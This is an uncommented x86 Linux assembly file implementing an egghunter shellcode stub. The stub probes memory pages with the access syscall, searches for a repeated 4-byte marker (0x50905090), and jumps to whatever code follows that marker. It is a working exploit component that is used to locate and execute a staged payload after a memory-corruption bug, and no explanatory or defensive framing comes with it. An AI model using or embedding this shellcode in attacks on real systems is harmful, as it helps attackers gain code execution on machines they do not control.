section .text

global _start

_start:

	xor ecx,ecx
	mul ecx
page:
	or dx,0xfff
incr:
	inc edx
	lea ebx,[edx+4]
	push 0x21
	pop eax	
	int 80h

	cmp al,0xf2
	jz page
	mov eax,0x50905090
	mov edi,edx
	scasd
	jnz incr
	scasd
	jnz incr
	jmp edi
